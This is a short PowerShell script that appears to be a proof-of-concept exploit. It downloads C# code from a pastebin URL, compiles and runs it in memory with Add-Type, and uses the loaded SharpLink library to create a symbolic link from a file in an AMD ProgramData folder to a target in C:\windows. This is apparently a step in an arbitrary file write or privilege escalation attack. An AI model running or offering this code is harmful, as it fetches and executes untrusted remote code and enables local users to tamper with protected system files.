$url = 'https://pastebin.com/raw/d1phQyXR'
$code = Invoke-WebRequest -Uri $url -UseBasicParsing;
Add-Type $code
$s = New-Object de.usd.SharpLink.Symlink("C:\ProgramData\AMD\PPC\send\1.txt", "C:\windows\target.txt")
$s.Open()
$s.Close()